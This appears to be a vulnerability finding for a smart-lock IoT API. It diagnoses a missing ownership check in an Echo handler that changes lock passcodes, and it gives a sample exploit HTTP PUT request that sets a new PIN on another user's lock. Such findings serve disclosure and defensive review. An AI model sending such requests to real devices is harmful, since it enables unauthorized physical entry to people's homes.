diagnosis: The UpdatePasscode Echo handler modifies smart lock passcodes by extracting lockID from path parameters. The JWT middleware confirms the user has an active IoT account, but the handler fails to confirm that the user has administrative privileges over the specified smart lock device. An attacker can set new PIN codes on victim residences and gain unauthorized physical entry.
exploit_request:
PUT /devices/locks/lock_frontdoor_4412/pin HTTP/1.1
Host: api.smartlock-iot.com
Authorization: Bearer valid_user_jwt_token
Content-Type: application/json

{"new_pin": "1234"}
